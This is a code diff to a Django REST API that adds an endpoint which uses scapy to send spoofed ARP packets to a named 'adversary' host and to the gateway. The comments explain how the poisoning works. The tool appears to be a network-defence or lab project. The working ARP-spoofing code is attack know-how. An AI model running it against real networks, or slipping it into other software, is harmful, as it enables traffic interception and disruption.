@@ -102,6 +102,41 @@ def UpdateGateway(request):
         f.write(json_string)
     return Response(status=200)
 
+@api_view(['POST'])
+def ArpPoisioning(request):
+    adversary_mac = (request.data["adversary_mac"])
+    adversary_ip = (request.data["adversary_ip"])
+    gateway_ip = (request.data["gateway"])
+    gateway = Device.objects.get(ip=gateway_ip)
+    gateway_mac = (gateway.mac)
+
+    print(gateway_mac)
+    print(gateway_ip)
+    print(adversary_ip)
+    print(adversary_mac)
+
+    # pdst = destination ip
+    # hwdst = destination mac
+    # psrc = source ip
+
+    # This packet is sending an ARP request to the adversary saying that the computer this packet is being sent from is the default gateway
+    adversaryARP_packet = scapy.ARP(pdst=adversary_ip, hwdst=adversary_mac, psrc=gateway_ip)
+    scapy.send(adversaryARP_packet)
+
+    # This packet is sending an ARP request to the default gateway saying that this computer is the adversary
+    gatewayARP_packet = scapy.ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=adversary_ip)
+    scapy.send(gatewayARP_packet)
+
+    # (Note): The ARP Packet will contain the hwsrc of the computer that the ARP packet is being sent from.
+    # ARP PACKET
+        # pdst = Destination IP
+        # psrc = Source IP
+        # hwdst = Desination MAC
+        # hwsrc = Source MAC (This is not explicitly set in the packet, but it will be set to the MAC address of the computer sending the ARP packet)
+    # Since ARP will resolve IP addresses to MAC addresses, the ARP packet will make the recipient think that that the IP address of psrc belongs to the MAC address of hwsrc. That's how the attack works.
+
+    return Response(status=200)
+
 @api_view(['DELETE'])
 def DeleteDatabase(self):
     Device.objects.all().delete()
